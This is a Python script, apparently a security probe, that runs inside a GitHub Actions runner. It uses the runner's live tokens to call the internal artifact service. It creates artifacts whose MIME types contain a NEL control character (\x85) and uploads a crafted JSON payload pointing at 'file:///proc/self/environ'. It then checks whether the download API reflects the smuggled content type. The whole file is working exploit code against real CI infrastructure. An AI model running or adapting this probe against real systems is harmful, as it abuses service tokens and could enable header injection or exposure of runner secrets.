import base64
import json
import os
import platform
import urllib.error
import urllib.parse
import urllib.request

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
GITHUB_TOKEN = os.environ['GITHUB_TOKEN']
REPO = os.environ['GITHUB_REPOSITORY']
RESULTS_URL = os.environ['ACTIONS_RESULTS_URL']
claims = json.loads(base64.urlsafe_b64decode(TOKEN.split('.')[1] + '==='))
scope = next(part for part in claims['scp'].split() if part.startswith('Actions.Results:'))
_, run_id, job_id = scope.split(':')
SERVICE = urllib.parse.urljoin(
    RESULTS_URL, '/twirp/github.actions.results.api.v1.ArtifactService/')


def fetch(url, body=None, headers=None, method=None, stop_redirect=False):
    request = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
    if stop_redirect:
        class Stop(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *args):
                return None
        opener = urllib.request.build_opener(Stop)
    else:
        opener = urllib.request.build_opener()
    try:
        response = opener.open(request, timeout=25)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.headers, response.read()


def rpc(method, document):
    body = json.dumps(document, separators=(',', ':')).encode()
    status, _, result = fetch(
        SERVICE + method, body,
        {'Authorization': f'Bearer {TOKEN}', 'Content-Type': 'application/json'},
        'POST')
    try:
        return status, json.loads(result)
    except json.JSONDecodeError:
        return status, {'raw': result.decode(errors='replace')[:160]}


def put_blob(url, body, mime):
    status, _, _ = fetch(url, body, {
        'Content-Type': 'application/octet-stream',
        'x-ms-version': '2023-11-03',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': mime,
    }, 'PUT')
    return status


common = {'workflow_run_backend_id': run_id, 'workflow_job_run_backend_id': job_id}
nel = '\x85application/json'
for label, version, mime in [
    ('v7-prefix', 7, nel),
    ('v7-suffix', 7, 'application/json\x85'),
    ('v6-prefix', 6, nel),
]:
    row = {'os': platform.system(), 'resultsHost': urllib.parse.urlsplit(RESULTS_URL).hostname,
           'case': label}
    name = f'runner-{os.environ["GITHUB_RUN_ID"]}-{platform.system().lower()}-{label}'
    status, created = rpc('CreateArtifact', {
        **common, 'name': name, 'version': version, 'mime_type': mime})
    row['createStatus'] = status
    if status != 200:
        row['createError'] = created.get('msg') or created.get('raw')
    else:
        url = created['signed_upload_url']
        row['initialUpload'] = put_blob(url, b'{}', mime)
        final_status, finalized = rpc('FinalizeArtifact', {
            **common, 'name': name, 'size': '2'})
        row['finalizeStatus'] = final_status
        if final_status == 200:
            artifact_id = finalized['artifact_id']
            row['artifactId'] = artifact_id
            repository = f'{REPO}/actions/artifacts/{artifact_id}/zip'
            payload = json.dumps({
                'full_name': repository,
                'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
            }, separators=(',', ':')).encode()
            row['payloadUpload'] = put_blob(url, payload, mime)
            api_url = f'https://api.github.com/repos/{REPO}/actions/artifacts/{artifact_id}/zip'
            api_status, api_headers, _ = fetch(api_url, headers={
                'Authorization': f'Bearer {GITHUB_TOKEN}',
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'repo-cassette-runner-variant',
            }, stop_redirect=True)
            row['restStatus'] = api_status
            location = api_headers.get('Location')
            if location:
                row['rsct'] = urllib.parse.parse_qs(
                    urllib.parse.urlsplit(location).query).get('rsct', [''])[0]
                download_status, download_headers, downloaded = fetch(location)
                row['downloadStatus'] = download_status
                content_type = download_headers.get('Content-Type', '')
                row['downloadTypeHex'] = content_type.encode('latin1').hex()
                row['bodyMatch'] = downloaded == payload
        else:
            row['finalizeError'] = finalized.get('msg') or finalized.get('raw')
    print('::notice title=Runner NEL probe::' +
          json.dumps(row, separators=(',', ':')), flush=True)
